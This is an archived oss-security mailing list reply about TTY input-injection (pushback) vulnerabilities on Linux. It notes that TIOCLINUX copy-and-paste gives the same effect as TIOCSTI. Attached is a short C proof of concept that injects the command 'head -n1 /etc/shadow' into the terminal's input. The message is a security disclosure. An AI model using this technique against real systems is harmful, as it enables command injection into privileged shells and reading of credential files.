<head>
 <meta http-equiv="Content-Type" content="text/html ">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>'Re: [oss-security] TTY pushback vulnerabilities / TIOCSTI' - MARC</title>
 <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body bgcolor="#ffffff" text="#000000" link="#0000C0" vlink="#800080">
<pre><b>[<a href="?l=oss-security&m=167878388806050&w=2">prev in list</a>] [<a href="?l=oss-security&m=167879081510352&w=2">next in list</a>] [<a href="?l=oss-security&m=167878388806050&w=2">prev in thread</a>] [<a href="?l=oss-security&m=167879081510352&w=2">next in thread</a>] </b>
<b><font size=+1>
List:       <a href="?l=oss-security&r=1&w=2">oss-security</a>
Subject:    <a href="?t=167878390800002&r=1&w=2">Re: [oss-security] TTY pushback vulnerabilities / TIOCSTI</a>
From:       <a href="?a=129054139200002&r=1&w=2">Jakub Wilk &lt;jwilk () jwilk ! net&gt;</a>
Date:       <a href="?l=oss-security&r=1&w=2&b=202303">2023-03-14 10:36:26</a>
Message-ID: <a href="?i=20230314103626.3ucbt2rjdfhjbe6t%20()%20jwilk%20!%20net">20230314103626.3ucbt2rjdfhjbe6t () jwilk ! net</a></font>
[Download RAW <a href="?l=oss-security&m=167879021709955&q=mbox">message</a> or <a href="?l=oss-security&m=167879021709955&q=raw">body</a>]</b>

* Hanno BÃ¶ck &lt;hanno@hboeck.de&gt;, 2023-03-14 09:51:
&gt;In the 2017 post solar designer mentioned that the Linux kernel 
&gt;developers have multiple times rejected changes in the kernel.

I believe this is the post in question:
<a href="https://www.openwall.com/lists/oss-security/2017/06/03/9" rel="nofollow">https://www.openwall.com/lists/oss-security/2017/06/03/9</a>

&gt;Starting with Kernel 6.2 it is possible to disable TIOCSTI (unset 
&gt;CONFIG_LEGACY_TIOCSTI).

Nice, but...

On Linux virtual terminals, it's possible to achieve pretty much the 
same effect using TIOCLINUX, the ioctl used by gpm to implement 
copy&amp;pasting.

I've attached a minimal PoC. A more elaborate one is here:
<a href="https://github.com/jwilk/ttyjack" rel="nofollow">https://github.com/jwilk/ttyjack</a>

-- 
Jakub Wilk

<a href="?l=oss-security&m=167879021709955&q=p3"><b>["minittyjack.c" (text/x-csrc)]</b></a>

#include &lt;stdio.h&gt;
#include &lt;sys/ioctl.h&gt;

#include &lt;linux/tiocl.h&gt;
#include &lt;linux/vt.h&gt;

int main(void)
{
    printf("\33[H\33[2J");
    printf("head -n1 /etc/shadow\n");
    fflush(stdout);
    struct {
        char padding;
        char subcode;
        struct tiocl_selection sel;
    } data = {
        .subcode = TIOCL_SETSEL,
        .sel = {
            .xs = 1, .ys = 1,
            .xe = 1, .ye = 1,
            .sel_mode = TIOCL_SELLINE
        }
    };
    ioctl(0, TIOCLINUX, &amp;data.subcode);
    data.subcode = TIOCL_PASTESEL;
    ioctl(0, TIOCLINUX, &amp;data.subcode);
}


<b>[<a href="?l=oss-security&m=167878388806050&w=2">prev in list</a>] [<a href="?l=oss-security&m=167879081510352&w=2">next in list</a>] [<a href="?l=oss-security&m=167878388806050&w=2">prev in thread</a>] [<a href="?l=oss-security&m=167879081510352&w=2">next in thread</a>] </b>
</pre>
  </pre><br><center>
    <a href="?q=configure">Configure</a> | 

    <a href="?q=about">About</a> |
    <a href="?q=news">News</a> |
    <a href="mailto:webguy@marc.info?subject=Add%20a%20list%20to%20MARC">Add&nbsp;a&nbsp;list</a> |
    Sponsored&nbsp;by&nbsp;<a href="http://www.korelogic.com/">KoreLogic</a>
</center>
</body>
</html>
